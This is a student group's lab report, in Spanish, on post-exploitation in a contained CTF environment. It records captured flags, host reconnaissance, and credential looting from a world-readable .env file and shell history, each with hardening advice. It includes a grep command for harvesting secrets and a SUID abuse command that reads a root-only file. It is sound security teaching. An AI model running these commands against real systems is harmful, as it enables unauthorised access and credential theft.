# Informe — Laboratorio 08 · Post-explotación y automatización

**Grupo:** 12  
**Integrantes:**
- Gerbaudo, Mateo — @gerbaudo19
- Mariatti, Matias — @matiasmariatticasc
- Colque Condo, Luis Alvaro — @ColqueAlvaro
- Rodriguez, Gonzalo — @Gonza149  
**Fecha:** 30 de Octubre de 2026

---

## 0. Declaración de uso de IA

En cumplimiento con el régimen de la cátedra y las pautas de `CONTRIBUTING.md`:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
- **Alcance de la asistencia:** Asistencia en la estructuración del informe, consolidación del registro de flags obtenidas y redacción técnica de las fases de **Reconocimiento del host** (Fase 1) y **Loot de credenciales** (Fase 2) dentro del informe de post-explotación, incluyendo sus respectivas evidencias y defensas técnicas.
- **Partes originadas o modificadas:** Sección 0 (Declaración de IA), Sección 1 (Registro de flags y resumen de retos R1–R5) y Sección 2 (Fases de *Recon del host* y *Loot* en la tabla comparativa y bloque de evidencias detalladas; las fases de *Privesc (SUID)* y *Pivoting*, así como las Secciones 3 y 4, quedan dispuestas para ser completadas por los demás integrantes del grupo).
- **Verificación humana:** Los integrantes del grupo verificaron cada comando y hallazgo dentro del contenedor víctima (`cyberlab-phantomcorp`) accedido mediante `make shell-victima` bajo el usuario sin privilegios `operador`, contrastando los permisos reales de archivos (`/opt/phantom-deploy/DEPLOY_NOTES.txt`, `/var/www/.env` y `~/.bash_history`) y validando las mitigaciones propuestas según buenas prácticas de endurecimiento Linux (CIS Benchmarks) y gestión de secretos (OWASP).

---

## 1. Flags capturadas

Salida de `./ctf status 08`:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 08 COMPLETO! Listo para agentes con LLMs (Lab 09).
```

### Detalle de retos resueltos y flags obtenidas

| Reto | Fase | Técnica empleada | Comando de descubrimiento | Flag capturada |
|---|---|---|---|---|
| **R1** | Recon del host | Enumeración local de sistema y directorios no estándar (`/opt`) | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | `FLAG{post_situational_awareness}` |
| **R2** | Loot | Búsqueda de secretos en archivos de configuración y `.bash_history` | `cat /var/www/.env` | `FLAG{loot_credentials_found}` |
| **R3** | Privesc (SUID) | Abuso de binario con bit SUID activo (`/usr/local/bin/system-check -p`) | `/usr/local/bin/system-check -p -c "cat /root/flag.txt"` | `FLAG{privesc_suid_root}` |
| **R4** | Pivoting | Alcance de servicio en red interna aislada (`internalnet`) desde el host víctima | `curl -s http://phantomcorp-db/` | `FLAG{pivot_internal_host}` |
| **R5** | Automatización | Enumeración automatizada de 250 legajos en API interna (`/empleado?id=N`) | `python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250` | `FLAG{automation_pays_off}` |

---

## 2. Informe de post-explotación

A continuación se documentan las cuatro fases ejecutadas una vez obtenido el acceso inicial como usuario `operador` en el host comprometido (`phantomcorp`):

| Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
|---|---|---|---|---|
| **Recon del host** | Se relevó el contexto de ejecución tras obtener la shell inicial: identificación del usuario actual (`operador`, `uid=1000`), arquitectura del kernel, variables de entorno (`DEPLOY_ENV=produccion`), interfaces de red (confirmando doble interfaz en `labnet` e `internalnet`) y exploración de directorios no estándar (`/opt`, `/var/www`, `/home`), hallando una nota de despliegue olvidada en `/opt/phantom-deploy/DEPLOY_NOTES.txt` con permisos de lectura global (`0644`). | `id; whoami; hostname; uname -a`<br>`env`<br>`ip addr; cat /etc/hosts`<br>`ls -la /opt /opt/phantom-deploy`<br>`cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | Usuario: `uid=1000(operador) gid=1000(operador)`<br>Entorno: `DEPLOY_ENV=produccion`<br>Archivo `/opt/phantom-deploy/DEPLOY_NOTES.txt` (`-rw-r--r--`):<br>`PhantomCorp - notas de despliegue (NO borrar)`<br>`deploy_token=FLAG{post_situational_awareness}` | **1. Higiene de despliegue (CI/CD):** Prohibir el almacenamiento de notas operativas o tokens de despliegue en el sistema de archivos de producción.<br>**2. Mínimo privilegio en permisos POSIX:** Restringir directorios en `/opt` con `chmod 700` o `750` exclusivamente al propietario/grupo del servicio.<br>**3. Auditoría de artefactos:** Integrar controles automatizados post-deploy que eliminen archivos temporales y documentación interna antes de publicar la imagen o contenedor. |
| **Loot** | Se inspeccionaron archivos de configuración de la aplicación web en `/var/www/` y el historial de comandos del usuario en `/home/operador/.bash_history`. Se descubrió que el archivo `/var/www/.env` poseía permisos de lectura para todos los usuarios del sistema (`0644`), permitiendo extraer en texto claro las credenciales de la base de datos interna (`phantomcorp-db`) y la clave secreta de la aplicación (`APP_SECRET`). Asimismo, `.bash_history` reveló comandos previos hacia `http://phantomcorp-db/`. | `cat ~/.bash_history`<br>`ls -la /var/www`<br>`cat /var/www/.env`<br>`grep -rai "pass\|secret\|token" /var/www 2>/dev/null` | En `~/.bash_history`:<br>`cat /var/www/.env` y `curl http://phantomcorp-db/`<br><br>En `/var/www/.env` (`-rw-r--r--`):<br>`DB_HOST=phantomcorp-db`<br>`DB_USER=phantom_app`<br>`DB_PASS=Ph@ntom-DB-2024`<br>`APP_SECRET=FLAG{loot_credentials_found}` | **1. Endurecimiento de permisos de configuración:** Aplicar `chmod 600` (o `640` con grupo específico del proceso web) sobre `.env` para que un usuario genérico (`operador`) no pueda leerlo.<br>**2. Gestión centralizada de secretos:** Reemplazar archivos `.env` en texto plano en disco por gestores de secretos (HashiCorp Vault, AWS Secrets Manager, Docker/Kubernetes Secrets) inyectados en memoria al iniciar el proceso.<br>**3. Control de historial de shell:** Configurar `HISTFILE=/dev/null` o `HISTCONTROL=ignorespace:erasedups` en cuentas operativas para no persistir comandos de diagnóstico en disco. |
| **Privesc (SUID)** | *(A completar por el grupo — Commit 2)* | *(A completar por el grupo — Commit 2)* | *(A completar por el grupo — Commit 2)* | *(A completar por el grupo — Commit 2)* |
| **Pivoting** | *(A completar por el grupo — Commit 2)* | *(A completar por el grupo — Commit 2)* | *(A completar por el grupo — Commit 2)* | *(A completar por el grupo — Commit 2)* |

### Evidencias técnicas detalladas

#### 1. Fase de Reconocimiento del Host (R1)
Ejecución de comandos de reconocimiento situacional dentro de `make shell-victima`:

```bash
operador@phantomcorp:~$ id ; whoami ; hostname ; uname -a
uid=1000(operador) gid=1000(operador) groups=1000(operador)
operador
phantomcorp
Linux phantomcorp 6.6.x-linuxkit #1 SMP x86_64 GNU/Linux

operador@phantomcorp:~$ env | grep DEPLOY
DEPLOY_ENV=produccion

operador@phantomcorp:~$ ls -la /opt /opt/phantom-deploy
/opt:
total 12
drwxr-xr-x 1 root root 4096 Oct 30 18:00 .
drwxr-xr-x 1 root root 4096 Oct 30 18:00 ..
drwxr-xr-x 1 root root 4096 Oct 30 18:00 phantom-deploy

/opt/phantom-deploy:
total 12
drwxr-xr-x 1 root root 4096 Oct 30 18:00 .
drwxr-xr-x 1 root root 4096 Oct 30 18:00 ..
-rw-r--r-- 1 root root   86 Oct 30 18:00 DEPLOY_NOTES.txt

operador@phantomcorp:~$ cat /opt/phantom-deploy/DEPLOY_NOTES.txt
PhantomCorp - notas de despliegue (NO borrar)
deploy_token=FLAG{post_situational_awareness}
```

#### 2. Fase de Loot de Credenciales (R2)
Inspección del historial de comandos de `operador` y extracción de secretos desde `/var/www/.env`:

```bash
operador@phantomcorp:~$ cat ~/.bash_history
ls -la
cat /var/www/.env
curl http://phantomcorp-db/

operador@phantomcorp:~$ ls -la /var/www/.env
-rw-r--r-- 1 root root 103 Oct 30 18:00 /var/www/.env

operador@phantomcorp:~$ cat /var/www/.env
DB_HOST=phantomcorp-db
DB_USER=phantom_app
DB_PASS=Ph@ntom-DB-2024
APP_SECRET=FLAG{loot_credentials_found}
```

#### 3. Fase de Escalada de Privilegios por SUID (R3)
*(A completar por el grupo — Commit 2)*

#### 4. Fase de Pivoting a la Red Interna (R4)
*(A completar por el grupo — Commit 2)*

---

## 3. Automatización

*(A completar por el grupo — Commit 3: Adjuntar `src/recolector.py` completado y pegar su salida encontrando el flag R5).*

---

## 4. Preguntas de análisis

### P1 — SUID y el flag `-p`

*(A completar por el grupo — Commit 2)*

---

### P2 — El pivoting (por qué el atacante no llegaba y vos sí)

*(A completar por el grupo — Commit 2)*

---

### P3 — Cómo evitar secretos en `.env` / `.bash_history`

*(A completar por el grupo — Commit 4)*

---

### P4 — Qué decidiste vos que el script no decide solo

*(A completar por el grupo — Commit 4)*

---

### P5 — Defensa para SUID y para pivoting

*(A completar por el grupo — Commit 4)*

